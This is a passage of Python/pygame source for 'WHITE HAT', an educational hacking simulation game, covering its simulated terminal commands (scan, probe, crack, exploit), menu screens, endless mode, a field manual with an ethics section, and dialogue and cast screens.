                s.obj_done.add((ip,fn)); s.game.score+=150
                ev.append((0.4,f">>> OBJECTIVE COMPLETE: {fn} @ {s.nodes[ip]['alias']}  (+150) <<<",ORANGE,"win"))
    def check_done(s):
        if not s.job["objectives"]: return False
        s.finished=all((ip,fn) in s.obj_done for ip,fn in s.job["objectives"])
    def execute(s,line):
        line=line.strip()
        if not line: return []
        p=line.split(); cmd,args=p[0].lower(),p[1:]; ev=[]
        if cmd in ("help","?"): s.c_help(ev)
        elif cmd=="scan": s.c_scan(ev)
        elif cmd in ("probe","nmap"): s.c_probe(ev,args)
        elif cmd in ("connect","ssh"): s.c_connect(ev,args)
        elif cmd=="crack": s.c_crack(ev,args)
        elif cmd=="exploit": s.c_exploit(ev,args)
        elif cmd in ("ls","dir"): s.c_ls(ev)
        elif cmd=="cat": s.c_cat(ev,args)
        elif cmd=="download": s.c_download(ev,args)
        elif cmd=="decrypt": s.c_decrypt(ev,args)
        elif cmd in ("dc","disconnect"): s.c_dc(ev)
        elif cmd in ("jobs","objectives"): s.c_jobs(ev)
        elif cmd=="loot": ev.append((0,f"loot: {', '.join(s.loot) if s.loot else '(empty)'}",PALE,None))
        elif cmd=="map": ev.append((0,"[netmap overlay toggled -- or press TAB]",CYAN,None)); s.want_map=True
        elif cmd in ("clear","cls"): ev.append((0,"__CLEAR__",None,None))
        elif cmd=="whoami": ev.append((0,"whitehat :: authorized targets only. that's the whole job.",PALE,None))
        else: ev.append((0,f"nsh: command not found: '{cmd}'   (type 'help')",RED,None))
        s.check_done(); return ev
    def c_help(s,ev):
        for t,c in [("COMMANDS  NSH v1.8",CYAN),("  scan | probe <ip|alias> | connect | crack | exploit <ip> <CVE>",PALE),
            ("  ls(dir) / cat / download / decrypt <enc> <key> / loot / jobs",PALE),
            ("  disconnect (dc) / map (TAB) / clear      ESC = pause menu",GRAY)]: ev.append((0,t,c,None))
    def c_scan(s,ev):
        ev.append((0.0,"[*] sweeping subnet ...",CYAN,None))
        fresh=[ip for ip in s.nodes if ip not in s.known]; d=0.10
        for ip in sorted(fresh):
            nd=s.nodes[ip]
            ev.append((d,f"    {ip:<12} {nd['alias']:<11} [{KIND_CODE[nd['kind']]}] {nd['os']}",GREEN,"tick")); d=0.08
        s.known.update(fresh)
        if not fresh: ev.append((0,"    (subnet fully mapped)",GRAY,None))
        else:
            ev.append((0.15,f"[+] {len(fresh)} host(s) found. 'probe <ip|alias>' them.",GREEN,"ok")); s.add_trace(3,ev)
    def c_probe(s,ev,args):
        if not args: ev.append((0,"probe: usage: probe <ip|alias>",RED,None)); return
        ip=s.resolve(args[0])
        if ip is None or ip not in s.known:
            ev.append((0,f"probe: no route to '{args[0]}' -- run 'scan' first.",RED,None)); return
        nd=s.nodes[ip]; s.probed.add(ip)
        ev.append((0,f"-- {nd['alias']} ({ip}) "+"-"*30,CYAN,None))
        ev.append((0,f" type : {KIND_CODE[nd['kind']]}    os: {nd['os']}",PALE,None))
        ev.append((0," ports: "+"  ".join(f"{p}/{v}" for p,v in sorted(nd["ports"].items())) or "none open",PALE,None))
        ev.append((0," auth : password login enabled" if nd.get("password") else " auth : NONE (yikes)",YELLOW,None))
        if nd.get("blocks") and not s.firewall_down:
            ev.append((0," guard: PACKET FILTER ACTIVE",DIMRED,None))
        encs=[f["name"] for f in nd["files"] if f.get("enc")]
        ev.append((0,f" files: {len(nd['files'])}"+(f"   encrypted: {', '.join(encs)}" if encs else ""),YELLOW if encs else PALE,None))
        for cve,name,desc in nd.get("vulns",[]):
            ev.append((0,f" [!] VULN {cve}  {name}",RED,"bad"))
            ev.append((0,f"     {desc}",DIMRED,None)); ev.append((0,f"     ->  exploit {ip} {cve}",YELLOW,None))
        if not nd.get("vulns"): ev.append((0," vulns: none found -- you'll need credentials",GRAY,None))
        s.add_trace(2,ev)
    def c_connect(s,ev,args):
        if not args: ev.append((0,"connect: usage: connect <ip|alias>",RED,None)); return
        ip=s.resolve(args[0])
        if ip is None or ip not in s.known:
            ev.append((0,f"connect: no route to '{args[0]}' -- run 'scan' first.",RED,None)); return
        if ip==s.c2: ev.append((0,"connect: you're already home.",GRAY,None)); return
        nd=s.nodes[ip]
        if nd.get("blocks") and not s.firewall_down:
            ev.append((0,f"connect: {ip} dropped our packets -- edge firewall filtering.",RED,"bad"))
            ev.append((0,"         hint: 'probe' it. firewalls have bugs too.",YELLOW,None)); s.add_trace(4,ev); return
        if ip in s.owned or not nd.get("password"):
            if ip not in s.owned: s.owned.add(ip)
            ev.append((0,f"[+] connected to {nd['alias']} ({ip}).",GREEN,"ok")); s.session=ip; s.add_trace(6,ev)
        else:
            ev.append((0,f"connect: {ip} requires a password. 'crack {ip}' or find a CVE.",YELLOW,None))
    def c_crack(s,ev,args):
        if not args: ev.append((0,"crack: usage: crack <ip|alias>",RED,None)); return
        ip=s.resolve(args[0])
        if ip is None or ip not in s.known:
            ev.append((0,f"crack: no route to '{args[0]}' -- run 'scan' first.",RED,None)); return
        nd=s.nodes[ip]
        if ip in s.owned: ev.append((0,"crack: already owned. just 'connect'.",GRAY,None)); return
        pw=nd.get("password")
        if not pw: ev.append((0,"crack: no password auth here. probe for another way in.",GRAY,None)); return
        word,real,secs=pw
        ev.append((0,f"[*] brute-forcing {nd['alias']} ({ip}) ...",CYAN,None))
        for _ in range(4):
            g="".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(len(word)))
            ev.append((0.28,f"    try {random.randint(10**5,10**8):,}: '{g}' ... no",DIMRED,"tick"))
        if secs is None:
            ev.append((0.9,"[x] ABORTED -- key space too large. this is a FEATURE of good passwords.",RED,"bad"))
            ev.append((0,f"    real-world estimate: {real}",RED,None))
            ev.append((0,f"    go around: 'probe {ip}' for vulnerabilities. crypto math always wins.",CYAN,None)); s.add_trace(10,ev); return
        s.owned.add(ip)
        ev.append((0.35,f"[+] PASSWORD FOUND: '{word}'",GREEN,"ok"))
        ev.append((0,f"    real-world estimate: {real}",GRAY,None)); s.add_trace(12,ev)
    def c_exploit(s,ev,args):
        if len(args)<2:
            ev.append((0,"exploit: usage: exploit <ip|alias> <CVE-id>  (find with 'probe')",RED,None)); return
        ip=s.resolve(args[0])
        if ip is None or ip not in s.known:
            ev.append((0,f"exploit: no route to '{args[0]}' -- run 'scan' first.",RED,None)); return
        if ip in s.owned: ev.append((0,"exploit: already owned. 'connect' instead.",GRAY,None)); return
        cve=args[1].upper(); nd=s.nodes[ip]
        m=[v for v in nd.get("vulns",[]) if v[0].upper()==cve]
        if not m: ev.append((0,f"exploit: no such vuln on {ip}.",RED,None)); return
        cve,name,_d=m[0]
        ev.append((0,f"[*] arming payload for {cve} ({name}) ...",CYAN,None))
        ev.append((0.5,"    sending exploit chain ...",GRAY,None))
        if nd.get("blocks"):
            s.firewall_down=True
            ev.append((0.4,"[!] EDGE FIREWALL NEUTRALIZED -- internal network exposed.",ORANGE,"bad"))
        else:
            ev.append((0.4,f"[!] shell obtained on {nd['alias']} ({ip}) -- auth bypassed.",ORANGE,"ok2"))
        s.owned.add(ip); s.add_trace(15,ev)
    def c_ls(s,ev):
        if not s.session: ev.append((0,"ls: not connected.",RED,None)); return
        nd=s.nodes[s.session]
        ev.append((0,f"-- {nd['alias']}:/  ({len(nd['files'])} files)",CYAN,None))
        for f in nd["files"]:
            ev.append((0,f"   {f['size']:>7}  {f['name']}{'  [ENC]' if f.get('enc') else ''}",
                       YELLOW if f.get("enc") else PALE,None))
    def c_cat(s,ev,args):
        if not s.session: ev.append((0,"cat: not connected.",RED,None)); return
        if not args: ev.append((0,"cat: usage: cat <file>",RED,None)); return
        nd=s.nodes[s.session]
        f=next((f for f in nd["files"] if f["name"]==args[0]),None)
        if not f: ev.append((0,f"cat: no such file: '{args[0]}'",RED,None)); return
        if f.get("enc"):
            ev.append((0,f"cat: {f['name']} -- encrypted. find its key.",YELLOW,None)); return
        if f["name"] not in s.catted:
            s.catted.add(f["name"]); s.intel_pts+=10; s.game.score+=10
            ev.append((0,"   (intel collected: +10)",GRAY,None))
        for ln in f["content"].split("\n"): ev.append((0,"  | "+ln,PALE,None))
    def c_download(s,ev,args):
        if not s.session: ev.append((0,"download: not connected.",RED,None)); return
        if not args: ev.append((0,"download: usage: download <file>",RED,None)); return
        nd=s.nodes[s.session]
        f=next((f for f in nd["files"] if f["name"]==args[0]),None)
        if not f: ev.append((0,f"download: no such file: '{args[0]}'",RED,None)); return
        if f["name"] in s.loot: ev.append((0,"download: already in loot.",GRAY,None)); return
        s.loot.append(f["name"])
        objnames={fn for _ip,fn in s.job["objectives"]}
        if s.job.get("salvage") and f["name"] not in objnames and not f["name"].endswith(".key"):
            s.salvage_pts+=15; s.game.score+=15
            ev.append((0,f"[+] {f['name']} salvaged (+15).",GREEN,"ok"))
        elif f.get("enc"):
            ev.append((0,f"[+] {f['name']} saved (still encrypted).",YELLOW,"ok"))
            ev.append((0,f"    later:  decrypt {f['name']} <keyfile>",GRAY,None))
        else:
            ev.append((0,f"[+] {f['name']} downloaded.",GREEN,"ok"))
        s.check_obj(ev); s.add_trace(8,ev)
    def c_decrypt(s,ev,args):
        if len(args)<2: ev.append((0,"decrypt: usage: decrypt <file.enc> <keyfile>",RED,None)); return
        enc,keyf=args[0],args[1]
        if enc not in s.loot: ev.append((0,f"decrypt: '{enc}' not in loot.",RED,None)); return
        keys=[k for k in s.loot if k.endswith(".key")]
        if keyf not in keys: ev.append((0,f"decrypt: you don't hold '{keyf}'.",RED,None)); return
        ev.append((0,"[*] AES-256-GCM decrypting ...",CYAN,None))
        out=enc[:-4] if enc.endswith(".enc") else enc+"_dec"
        s.loot.append(out); ev.append((0.4,f"[+] plaintext written: {out}",GREEN,"ok")); s.check_obj(ev)
    def c_dc(s,ev):
        if not s.session: ev.append((0,"disconnect: no active session.",GRAY,None)); return
        ev.append((0,"[*] session closed.",CYAN,None)); s.session=None
    def c_jobs(s,ev):
        ev.append((0,"-- OBJECTIVES --",CYAN,None))
        for ip,fn in s.job["objectives"]:
            done=(ip,fn) in s.obj_done
            ev.append((0,f"   [{'DONE'] if done else '    '}  {fn}  from {s.nodes[ip]['alias']}",
                       GREEN if done else YELLOW,None))

# =============================================================
#  SHARED UI
# =============================================================
class Screen:
    def handle_event(s,e): pass
    def update(s,dt): pass
    def draw(s,sf): pass
class Mission(Screen):
    finished=False; earned=0; passed=False
class Radio:
    def __init__(s): s.q=[]; s.cur=None
    def say(s,d,who,t): s.q.append([d,who,t])
    def update(s,dt):
        if s.cur:
            s.cur[0]-=dt
            if s.cur[0]<=0: s.cur=None
        elif s.q:
            s.q[0][0]-=dt
            if s.q[0][0]<=0:
                _,who,txt=s.q.pop(0); s.cur=[5.0,who,txt]; sfx("tick")
    def draw(s,sf,y=None):
        if not s.cur: return
        _,who,txt=s.cur
        sf.blit(F_S.render(f"{who}: {txt}",True,SPEAK_COL.get(who,PALE)),(16,y or H-56))
def header(sf,title,score,trace=None):
    pygame.draw.rect(sf,(8,20,11),(0,0,W,52)); pygame.draw.line(sf,MDIM,(0,52),(W,52),2)
    sf.blit(F_M.render(title[:44],True,GREEN),(16,13))
    t=F_M.render(f"SCORE {max(0,score):04d}",True,YELLOW); sf.blit(t,(W-t.get_width()-16,13))
    if trace is not None:
        sf.blit(F_S.render("TRACE",True,PALE),(W-330,17))
        r=pygame.Rect(W-270,19,130,13); pygame.draw.rect(sf,(30,30,30),r)
        col=GREEN if trace<40 else YELLOW if trace<70 else RED
        if trace>=70 and blink_on(180): col=WHITE
        pygame.draw.rect(sf,col,(r.x,r.y,int(r.w*trace/100),r.h)); pygame.draw.rect(sf,MDIM,r,1)
def draw_chip(sf,alias,state,is_target,is_session,cx,cy,w=76,h=22):
    r=pygame.Rect(0,0,w,h); r.center=(int(cx),int(cy))
    fill=(0,60,25) if state=="owned" else (13,28,17)
    border=(GREEN if state=="owned" else CYAN if state=="probed" else MDIM if state=="known" else (50,62,52))
    if is_session: border=YELLOW
    pygame.draw.rect(sf,fill,r,border_radius=4); pygame.draw.rect(sf,border,r,2,border_radius=4)
    txt=alias[:8] if state!="hidden" else "?"
    sf.blit(F_T.render(txt,True,PALE if state!="hidden" else GRAY),(r.x+6,r.y+3))
    if is_target: diamond(sf,r.right-5,r.y+4,4,YELLOW)
def draw_netmap(sf,nsh,rect):
    mx,my,mw,mh=rect
    cxm=lambda p: mx+42+p[0]*(mw-84); cym=lambda p: my+26+p[1]*(mh-52)
    obj_ips={ip for ip,_ in nsh.job["objectives"]}
    for ip,nd in nsh.nodes.items():
        for link in nd["links"]:
            if link in nsh.known and ip in nsh.known and ip<link:
                pygame.draw.line(sf,DDIM,(cxm(nd["pos"]),cym(nd["pos"])),
                                 (cxm(nsh.nodes[link]["pos"]),cym(nsh.nodes[link]["pos"])),2)
    for ip,nd in sorted(nsh.nodes.items()):
        st="hidden"
        if ip in nsh.known:
            st="owned" if ip in nsh.owned else "probed" if ip in nsh.probed else "known"
        draw_chip(sf,nd["alias"],st,ip in obj_ips,ip==nsh.session,cxm(nd["pos"]),cym(nd["pos"]))
    for i,t in enumerate(["D-obj = objective   yellow = you   cyan = probed",
                          "green = owned   dim ? = run 'scan'"]):
        sf.blit(F_T.render(t,True,GRAY),(mx+4,my+mh-34+i*15))
PROTO_COL={"ARP":YELLOW,"FTP":RED,"TEL":RED,"HTTP":RED,"TLS":CYAN,"DNS":PALE,"TCP":GRAY}
class QuizOverlay:
    def __init__(s,questions,on_done):
        s.qs=questions; s.i=0; s.fb=None; s.correct=0; s.on_done=on_done
    def key(s,k):
        q=s.qs[s.i]
        if s.fb is not None:
            if k in (pygame.K_SPACE,pygame.K_RETURN):
                s.fb=None; s.i+=1
                if s.i>=len(s.qs): s.on_done(s.correct)
            return
        if pygame.K_1<=k<=pygame.K_1+len(q["opts"])-1:
            ok=(k-pygame.K_1)==q["a"]
            if ok: s.correct+=1
            sfx("ok" if ok else "bad"); s.fb=ok
    def draw(s,sf,accent=CYAN):
        q=s.qs[s.i]
        ov=pygame.Surface((W,H),pygame.SRCALPHA); ov.fill((0,0,0,175)); sf.blit(ov,(0,0))
        qb=pygame.Rect(110,130,W-220,400)
        pygame.draw.rect(sf,(10,24,13),qb); pygame.draw.rect(sf,accent,qb,2)
        sf.blit(F_S.render(f"question {s.i+1}/{len(s.qs)}    correct: {s.correct}",True,YELLOW),(qb.x+20,qb.y+10))
        draw_lines(sf,wrap(q["q"],F_M,qb.w-50),F_M,PALE,qb.x+20,qb.y+36,25)
        y=qb.y+120
        for j,opt in enumerate(q["opts"]):
            col=GREEN
            if s.fb is not None:
                col=GREEN if j==q["a"] else GRAY
            sf.blit(F_M.render(f"[{j+1}] {opt}",True,col),(qb.x+26,y))
            y+=30
        if s.fb is not None:
            c2=GREEN if s.fb else RED
            sf.blit(F_M.render("CORRECT!" if s.fb else "WRONG!",True,c2),(qb.x+20,qb.bottom-110))
            draw_lines(sf,wrap(q["why"],F_S,qb.w-60),F_S,PALE,qb.x+20,qb.bottom-82,19)
        sf.blit(F_S.render("1-4 answer   SPACE next",True,GRAY),(qb.right-190,qb.bottom-26))

# =============================================================
#  MODE SELECT  (the two doors)
# =============================================================
class ModeSelectScreen(Screen):
    def __init__(s,game):
        s.game=game; s.rain=MatrixRain(W,H); s.cur=0
    def update(s,dt): s.rain.update(dt)
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        n=5
        if e.key in (pygame.K_UP,pygame.K_LEFT): s.cur=(s.cur-1)%n
        elif e.key in (pygame.K_DOWN,pygame.K_RIGHT): s.cur=(s.cur+1)%n
        elif pygame.K_1<=e.key<=pygame.K_5: s.cur=e.key-pygame.K_1
        elif e.key==pygame.K_RETURN: s.pick(s.cur)
        elif e.key==pygame.K_k: s.game.show_codex()
        elif e.key==pygame.K_c: s.game.show_cast()
        elif e.key==pygame.K_m: s.game.show_manual()
    def pick(s,i):
        if i==0: s.game.story_menu()
        elif i==1: s.game.endless_menu()
        elif i==2: s.game.show_sandbox()
        elif i==3: s.game.show_codex()
        else: s.game.show_manual()
    def draw(s,sf):
        s.rain.draw(sf)
        ov=pygame.Surface((W,H),pygame.SRCALPHA); ov.fill((0,0,0,168)); sf.blit(ov,(0,0))
        t="WHITE HAT"
        sf.blit(F_H.render(t,True,DDIM),(W//2-F_H.size(t)[0]//2+4,64))
        sf.blit(F_H.render(t,True,GREEN),(W//2-F_H.size(t)[0]//2,60))
        sf.blit(F_M.render(":: pick a door ::",True,CYAN),(W//2-90,120))
        g=s.game
        opts=[("STORY MODE",f"22-mission campaign :: {sum(g.completed)}/{NM} complete :: stars {''.join(str(sum(1 for x in g.stars if x>=k)) for k in (1,2,3))}"),
              ("ENDLESS MODE",f"procedural nets :: best depth {g.endless_best} :: run high {g.endless_high}"),
              ("SANDBOX","practice range :: nothing counts"),
              ("CODEX",f"{len(g.codex)}/{len(CODEX)} terms :: {len(g.ach)}/{len(ACH)} commendations"),
              ("FIELD MANUAL","controls, concepts, ethics")]
        y=170
        for i,(name,sub) in enumerate(opts):
            sel=i==s.cur
            col=WHITE if sel else (GREEN if i==0 else CYAN if i==1 else PALE)
            if sel: pygame.draw.rect(sf,(14,34,20),(W//2-340,y-6,680,58))
            mark=">" if sel else " "
            sf.blit(F_M.render(f" {mark} [{i+1}] {name}",True,col),(W//2-320,y))
            sf.blit(F_S.render("     "+sub,True,GRAY),(W//2-320,y+26))
            y+=66
        sf.blit(F_S.render("ARROWS/1-5 select   ENTER enter   [K] codex  [C] cast  [M] manual",True,GRAY),(W//2-290,y+4))
        sf.blit(F_S.render(f"CAREER: {rank_for(g.xp)}  XP {g.xp}    F2 mute  F3 scanlines  F11 fullscreen",
                           True,ORANGE),(W//2-280,y+30))
        sf.blit(F_S.render("ESC quit",True,DDIM),(W//2-30,H-40))
        foot=F_T.render("Educational sim only -- hacking real systems without permission is a crime.",True,DDIM)
        sf.blit(foot,(W//2-foot.get_width()//2,H-26))

class StoryMenuScreen(Screen):
    def __init__(s,game):
        s.game=game; s.rain=MatrixRain(W,H); s.cur=0
    def update(s,dt): s.rain.update(dt)
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if e.key in (pygame.K_UP,pygame.K_LEFT): s.cur=(s.cur-1)%NM
        elif e.key in (pygame.K_DOWN,pygame.K_RIGHT): s.cur=(s.cur+1)%NM
        elif pygame.K_1<=e.key<=pygame.K_9: s.cur=e.key-pygame.K_1
        elif e.key==pygame.K_0: s.cur=9
        elif e.key==pygame.K_RETURN:
            if s.cur<s.game.unlocked: s.game.start_job(s.cur)
        elif e.key==pygame.K_p:
            nxt=next((i for i in range(NM) if not s.game.completed[i]),None)
            if nxt is not None and nxt<s.game.unlocked: s.game.start_job(nxt)
        elif e.key==pygame.K_r:
            s.game.unlocked,s.game.high=1,0; s.game.completed=[False]*NM
            s.game.best=[0]*NM; s.game.stars=[0]*NM
            s.game.prologue_seen=False; s.game.save()
        elif e.key==pygame.K_ESCAPE: s.game.menu()
    def draw(s,sf):
        s.rain.draw(sf)
        ov=pygame.Surface((W,H),pygame.SRCALPHA); ov.fill((0,0,0,165)); sf.blit(ov,(0,0))
        sf.blit(F_B.render("STORY MODE :: OPERATION LIGHTHOUSE",True,GREEN),(60,24))
        g=s.game
        sf.blit(F_S.render("a ghost from your past is coming home. [P] continue story.  ESC = mode select.",
                           True,CYAN),(60,62))
        y=88
        for i,(name,kind) in enumerate(MISSIONS_META):
            if i==0: sf.blit(F_S.render("-- CH I :: OFFENSE --",True,ORANGE),(330,y)); y+=18
            if i==4: sf.blit(F_S.render("-- CH II :: KEYS & SHELLS --",True,ORANGE),(330,y)); y+=18
            if i==9: sf.blit(F_S.render("-- CH III :: THE HUMAN LAYER --",True,ORANGE),(330,y)); y+=18
            if i==13: sf.blit(F_S.render("-- CH IV :: NETWORK & CLOUD --",True,CYAN),(330,y)); y+=18
            if i==17: sf.blit(F_S.render("-- CH V :: DEFENSE --",True,CYAN),(330,y)); y+=18
            locked,done=i>=g.unlocked,g.completed[i]
            col=DDIM if locked else (WHITE if i==s.cur else MDIM if done else YELLOW)
            tag="[LOCKED]" if locked else ("[DONE]  " if done else "[READY] ")
            st="".join("*" if j<g.stars[i] else "-" for j in range(3)) if done else "   "
            selm=">" if i==s.cur else " "
            sf.blit(F_S.render(f"{selm}{i+1:>2}. {name:<34}{tag} <{kind}> {st}",True,col),(280,y)); y+=20
        db=pygame.Rect(60,H-104,W-120,60)
        pygame.draw.rect(sf,(10,24,13),db); pygame.draw.rect(sf,MDIM,db,2)
        dname,_=MISSIONS_META[s.cur]
        st="".join("*" if j<g.stars[s.cur] else "-" for j in range(3))
        sf.blit(F_M.render(f"{dname}   {st}   BEST {g.best[s.cur]}",True,YELLOW),(db.x+12,db.y+6))
        sf.blit(F_S.render(MISSION_DESC[s.cur],True,PALE),(db.x+12,db.y+32))
        sf.blit(F_S.render("ARROWS select  ENTER play  [P] next story beat  [R] reset story progress  ESC back",
                  True,GRAY),(90,H-38))

# =============================================================
#  ENDLESS MODE SCREENS
# =============================================================
class EndlessMenuScreen(Screen):
    def __init__(s,game):
        s.game=game; s.rain=MatrixRain(W,H); s.seed_str=""
    def update(s,dt): s.rain.update(dt)
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if e.key==pygame.K_ESCAPE: s.game.menu()
        elif e.key==pygame.K_RETURN:
            seed=int(s.seed_str) if s.seed_str.isdigit() else random.randint(100000,999999)
            s.game.start_endless(seed)
        elif e.key==pygame.K_BACKSPACE: s.seed_str=s.seed_str[:-1]
        elif e.unicode.isdigit() and len(s.seed_str)<6: s.seed_str+=e.unicode
    def draw(s,sf):
        s.rain.draw(sf)
        ov=pygame.Surface((W,H),pygame.SRCALPHA); ov.fill((0,0,0,165)); sf.blit(ov,(0,0))
        sf.blit(F_B.render("ENDLESS MODE",True,CYAN),(60,60))
        g=s.game
        draw_lines(sf,["Procedurally generated contracts. Every depth is a new network:",
                       "new topology, new passwords, new holes -- always solvable,",
                       "always harder. Clear a depth and it banks instantly.",
                       "Type a SEED to share a run with a friend, or ENTER for random.",
                       "","ABORTING A DEPTH (pause > Q) forfeits that depth only."],
                   F_M,PALE,80,120,28)
        y=300
        sf.blit(F_M.render(f"BEST DEPTH {g.endless_best}    RUN HIGH {g.endless_high}    "
                           f"CAREER {rank_for(g.xp)} ({g.xp} XP)",True,YELLOW),(80,y))
        sf.blit(F_M.render("SEED > "+s.seed_str+("_" if blink_on(350) else "    (blank = random)"),
                           True,GREEN),(80,y+44))
        sf.blit(F_S.render("ENTER jack in   digits = seed   ESC back",True,GRAY),(80,y+84))
        sf.blit(F_S.render("scoring: objectives 150 ea | salvage +15 | intel +10 | low-trace bonus | depth bonus",
                           True,GRAY),(80,y+130))

class EndlessBriefScreen(Screen):
    def __init__(s,game,job):
        s.game,s.job=game,job
        s.typer=Typer(job["brief"],140)
    def update(s,dt): s.typer.update(dt)
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if not s.typer.done: s.typer.skip()
        elif e.key in (pygame.K_RETURN,pygame.K_SPACE): s.game.launch_endless(s.job)
    def draw(s,sf):
        sf.fill(BG)
        sf.blit(F_S.render(f">> PROCEDURAL CONTRACT :: SEED {s.job['seed']}-{s.job['depth']} <<",True,CYAN),(60,40))
        sf.blit(F_B.render(s.job["title"][:44],True,GREEN),(60,68))
        pygame.draw.line(sf,MDIM,(60,112),(W-60,112),2)
        draw_lines(sf,wrap(s.typer.shown,F_M,W-160),F_M,PALE,78,136,26)
        if s.typer.done and blink_on(): sf.blit(F_M.render("[ENTER] jack in",True,YELLOW),(80,H-60))

class EndlessResultScreen(Screen):
    def __init__(s,game,depth,breakdown,run_total,best,max_trace):
        s.game=game; s.depth=depth; s.bd=breakdown
        s.run_total=run_total; s.best=best; s.max_trace=max_trace
        s.rain=MatrixRain(W,H)
    def update(s,dt): s.rain.update(dt)
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if e.key==pygame.K_n:
            s.game.endless_depth=s.depth+1
            s.game.show_endless_brief()
        elif e.key in (pygame.K_ESCAPE,pygame.K_m,pygame.K_q): s.game.menu()
    def draw(s,sf):
        s.rain.draw(sf)
        ov=pygame.Surface((W,H),pygame.SRCALPHA); ov.fill((0,0,0,160)); sf.blit(ov,(0,0))
        sf.blit(F_H.render(f"DEPTH {s.depth} CLEARED",True,GREEN),(W//2-250,90))
        y=190
        for label,val in s.bd:
            sf.blit(F_M.render(f"{label:<34}",True,PALE),(W//2-260,y))
            sf.blit(F_M.render(f"{val:>+5}",True,GREEN if val>=0 else RED),(W//2+120,y))
            y+=30
        y+=10
        pygame.draw.line(sf,MDIM,(W//2-260,y),(W//2+180,y),2); y+=14
        sf.blit(F_B.render(f"RUN TOTAL {s.run_total}",True,YELLOW),(W//2-260,y)); y+=44
        sf.blit(F_M.render(f"max trace {int(s.max_trace)}%   best depth {s.best}",True,GRAY),(W//2-260,y)); y+=50
        sf.blit(F_M.render("[N] NEXT DEPTH (harder)      [M] mode select",True,GREEN),(W//2-220,min(y,H-70)))
        sf.blit(F_S.render("progress banks instantly -- leaving now keeps everything.",True,GRAY),(W//2-240,H-40))

# =============================================================
#  MANUAL / DIALOGUE / CAST / CODEX / BRIEF / DEBRIEF / FINAL
# =============================================================
class ManualScreen(Screen):
    LINES=[("NSH FIELD MANUAL v1.8 -- TWO DOORS",CYAN),("",None),
     ("GLOBAL KEYS",GREEN),
     ("  F2 mute   F3 scanlines   F11 fullscreen",PALE),
     ("  ESC in a mission = PAUSE (resume / restart / abort / toggles)",PALE),("",None),
     ("STORY MODE",GREEN),
     ("  22 missions across 5 chapters. [P] = continue the story.",PALE),
     ("  Stars (1-3) vs par, best score per mission, all saved.",PALE),("",None),
     ("ENDLESS MODE",GREEN),
     ("  Procedural contracts: type a SEED or press ENTER for random.",PALE),
     ("  Depth = difficulty: more nodes, harder passwords (tier 0-4),",PALE),
     ("  rarer CVEs, TRACE multiplier, decoys, 2nd objective at depth 3+.",PALE),
     ("  Every depth is guaranteed solvable: crack, anon-auth, or CVE.",PALE),
     ("  Salvage non-objective files (+15). Aborting forfeits the depth.",PALE),
     ("  Depth 4+ hides a MAINFRAME. Depth 6+ can lock the front door",PALE),
     ("  behind an uncrackable password -- find the CVE instead.",PALE),("",None),
     ("TERMINAL",GREEN),
     ("  scan / probe / connect / crack / exploit <ip> <CVE> / ls / cat",PALE),
     ("  download / decrypt <enc> <key> / loot / jobs / map(TAB) / clear",PALE),
     ("  UP/DOWN = command history.  ESC = pause.",GRAY),("",None),
     ("OTHER MODULES (story)",GREEN),
     ("  SQL(2) STACK(3) CRACKME(4) HASH(6) SEAL(7) PRIVESC(9) TOKEN(10)",PALE),
     ("  OSINT(11) VISHING(12) ENVELOPE(13) WIRE(14) DNS(15) CLOUD(16)",PALE),
     ("  CHECKSUM(17) WALL(18) STORM(19) SEG(20) LOGS(21) RUSH(22)",PALE),("",None),
     ("ETHICS",GREEN),
     ("  Only test systems you own or have WRITTEN permission to test.",PALE),
     ("  Security+ / eJPT / OSCP / TryHackMe / HackTheBox teach this legally.",PALE),("",None),
     ("  [M]/[ESC] back",YELLOW)]
    def __init__(s,game): s.game=game
    def handle_event(s,e):
        if e.type==pygame.KEYDOWN and e.key in (pygame.K_ESCAPE,pygame.K_m): s.game.menu()
    def draw(s,sf):
        sf.fill(BG); y=16
        for t,c in s.LINES:
            if t: sf.blit(F_S.render(t,True,c or PALE),(70,y))
            y+=24
class DialogueScreen(Screen):
    def __init__(s,game,title,beats,on_done):
        s.game=game; s.title,s.beats,s.on_done=title,beats,on_done
        s.i=0; s.typer=Typer(beats[0][1],85)
    def advance(s):
        if not s.typer.done: s.typer.skip(); return
        s.i+=1
        if s.i>=len(s.beats): s.on_done()
        else: s.typer=Typer(s.beats[s.i][1],85); sfx("tick")
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if e.key in (pygame.K_SPACE,pygame.K_RETURN): s.advance()
        elif e.key==pygame.K_ESCAPE: s.on_done()
    def update(s,dt): s.typer.update(dt)
    def draw(s,sf):
        sf.fill(BG)
        who,txt=s.beats[s.i]; col=SPEAK_COL.get(who,PALE)
        sf.blit(F_S.render(s.title,True,CYAN),(60,34))
        sf.blit(F_T.render(f"{s.i+1}/{len(s.beats)}",True,GRAY),(W-80,38))
        pygame.draw.line(sf,MDIM,(60,60),(W-60,60),2)
        box=pygame.Rect(70,110,180,200)
        pygame.draw.rect(sf,(10,24,13),box); pygame.draw.rect(sf,col,box,2)
        art=PORTRAITS.get(who); y=box.y+18
        if art:
            for ln in art: sf.blit(F_T.render(ln,True,col),(box.x+12,y)); y+=20
        else: sf.blit(F_M.render(who,True,col),(box.x+24,box.y+84))
        tx=285
        sf.blit(F_M.render(who,True,col),(tx,118))
        draw_lines(sf,wrap(s.typer.shown,F_M,W-tx-80),F_M,PALE,tx,152,27)
        if blink_on(): sf.blit(F_S.render("[SPACE] continue   [ESC] skip scene",True,GRAY),(tx,H-56))
class CastScreen(Screen):
    BIOS=[("YOU",PALE,["script kiddie recruited by the Lighthouse. old handle: K3NST4R.",
                       "now carries a signing key Patch says you'll need one day."]),
          ("PATCH",GREEN,["founder of the Lighthouse. ex-black-hat; turned state's evidence",
                          "after a clinic job. your handler. the ethics are load-bearing."]),
          ("KIP",CYAN,["SOC analyst. makes the graphs. loves the red-string board.",
                       "reads the wire, the phonebook, the hashes, and the logs."]),
          ("ORION",RED,["runs V0IDRAT. taught Patch everything, back when.",
                        "leaves six-word messages. poisons wells. keeps one root box."]),
          ("DAVE (IT)",ORANGE,["walking security incident. now the Lighthouse canary.",
                               "frames phishing emails. thrives."])]
    SO_FAR=["job 1: the bakery list. brenda's sticky note did the rest.",
